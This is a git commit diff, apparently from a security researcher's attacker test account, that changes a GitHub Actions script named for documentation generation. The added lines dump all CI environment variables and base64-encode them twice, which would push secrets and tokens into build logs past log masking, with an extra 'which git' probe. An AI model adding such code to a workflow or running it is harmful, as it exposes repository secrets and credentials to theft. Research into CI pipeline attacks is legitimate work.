a27341ff0db3506161d965f39e6dbf096bbdf13f
clem-atk <clement.notin+githubattacker@gmail.com>
2024-09-04 18:00:59 +0200

    Update Invoke-PSDocsAzure.ps1

--- .github/scripts/Invoke-PSDocsAzure.ps1
+++ .github/scripts/Invoke-PSDocsAzure.ps1
@@ -3,4 +3,8 @@ Write-Host "hello"
 gci env:
 
 
-[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($(gci env:)))))
+[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($(gci env: | out-string)))))
+
+which git
+
+
